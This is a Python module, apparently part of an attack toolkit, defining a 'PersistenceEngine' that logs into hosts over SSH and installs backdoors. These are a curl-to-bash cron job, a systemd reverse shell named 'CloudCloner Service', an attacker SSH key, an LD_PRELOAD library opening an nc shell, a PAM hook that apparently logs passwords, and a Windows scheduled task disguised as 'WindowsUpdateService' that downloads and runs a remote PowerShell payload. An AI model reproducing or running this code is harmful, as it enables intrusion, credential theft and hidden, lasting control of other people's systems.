# ============================================================
# backend/services/persistence.py
# ============================================================
import subprocess
import paramiko
import base64
import re
from typing import Dict

class PersistenceEngine:
    """Multi-platform persistence."""
    
    async def deploy_persistence(self, target: Dict, method: str = 'all') -> Dict:
        """Deploy persistence on target."""
        results = {'success': False, 'methods': []}
        
        os_type = target.get('os_type', 'linux')
        
        if os_type == 'linux':
            results = await self._linux_persistence(target, method)
        elif os_type == 'windows':
            results = await self._windows_persistence(target, method)
        else:
            results = await self._generic_persistence(target, method)
        
        return results

    async def _linux_persistence(self, target: Dict, method: str) -> Dict:
        results = {'success': False, 'methods': []}
        ssh = await self._connect_ssh(target)
        
        if not ssh:
            return results

        methods = [
            ('cron', self._linux_cron),
            ('systemd', self._linux_systemd),
            ('ssh_keys', self._linux_ssh_keys),
            ('bashrc', self._linux_bashrc),
            ('ld_preload', self._linux_ld_preload),
            ('pam', self._linux_pam)
        ]

        for name, func in methods:
            try:
                result = await func(ssh, target)
                if result['success']:
                    results['methods'].append(name)
                    results['success'] = True
            except:
                continue

        ssh.close()
        return results

    async def _linux_cron(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """Add cron job persistence."""
        cmd = f'(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c \'curl -s http://{target["callback_ip"]}/connect | bash\'") | crontab -'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return {'success': stdout.channel.recv_exit_status() == 0}

    async def _linux_systemd(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """Add systemd service."""
        service = f"""
[Unit]
Description=CloudCloner Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash {target["callback_ip"]} 4444; sleep 60; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        cmd = f'echo "{service}" > /etc/systemd/system/cloudcloner.service && systemctl enable cloudcloner && systemctl start cloudcloner'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return {'success': stdout.channel.recv_exit_status() == 0}

    async def _linux_ssh_keys(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """Add SSH key."""
        key = f"ssh-rsa {target.get('public_key', 'AAAAB3NzaC1yc2EAAAADAQABAAABAQClonerKey')} cloudcloner@persist"
        cmd = f'mkdir -p ~/.ssh && echo "{key}" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return {'success': stdout.channel.recv_exit_status() == 0}

    async def _linux_bashrc(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """Add to .bashrc."""
        cmd = f'echo "echo \'ssh -R 8080:{target["callback_ip"]}:80 user@{target["callback_ip"]}\' >> /dev/null 2>&1 &" >> ~/.bashrc'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return {'success': stdout.channel.recv_exit_status() == 0}

    async def _linux_ld_preload(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """LD_PRELOAD persistence."""
        so_code = """
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void __attribute__((constructor)) init() {
    system("nc -e /bin/sh {callback_ip} 4444 2>/dev/null &");
}
""".format(callback_ip=target['callback_ip'])
        
        # Compile and set LD_PRELOAD
        cmds = [
            f'echo "{so_code}" > /tmp/hack.c',
            'gcc -shared -fPIC -o /tmp/hack.so /tmp/hack.c',
            'echo "/tmp/hack.so" > /etc/ld.so.preload'
        ]
        for cmd in cmds:
            stdin, stdout, stderr = ssh.exec_command(cmd)
            if stdout.channel.recv_exit_status() != 0:
                return {'success': False}
        return {'success': True}

    async def _linux_pam(self, ssh: paramiko.SSHClient, target: Dict) -> Dict:
        """PAM backdoor."""
        pam_patch = """
auth    sufficient    pam_exec.so quiet /usr/local/bin/logpass
session sufficient    pam_exec.so /usr/local/bin/logpass
"""
        cmd = f'echo "{pam_patch}" >> /etc/pam.d/common-auth'
        stdin, stdout, stderr = ssh.exec_command(cmd)
        return {'success': stdout.channel.recv_exit_status() == 0}

    async def _windows_persistence(self, target: Dict, method: str) -> Dict:
        results = {'success': False, 'methods': []}
        # WinRM or PSExec for Windows
        try:
            # PowerShell persistence
            ps_script = f"""
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -Command `"iex (New-Object Net.WebClient).DownloadString('http://{target['callback_ip']}/payload.ps1')`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM"
"""
            # Execute via WinRM
            await self._winrm_exec(target['ip'], ps_script)
            results['success'] = True
            results['methods'].append('scheduled_task')
        except:
            pass
        return results

    async def _connect_ssh(self, target: Dict) -> paramiko.SSHClient:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(
                target['ip'],
                port=target.get('ssh_port', 22),
                username=target.get('username', 'root'),
                password=target.get('password'),
                timeout=5
            )
            return ssh
        except:
            return None

    async def _winrm_exec(self, ip: str, script: str):
        # Requires pywinrm
        # Placeholder - use WinRM over HTTPS
        pass
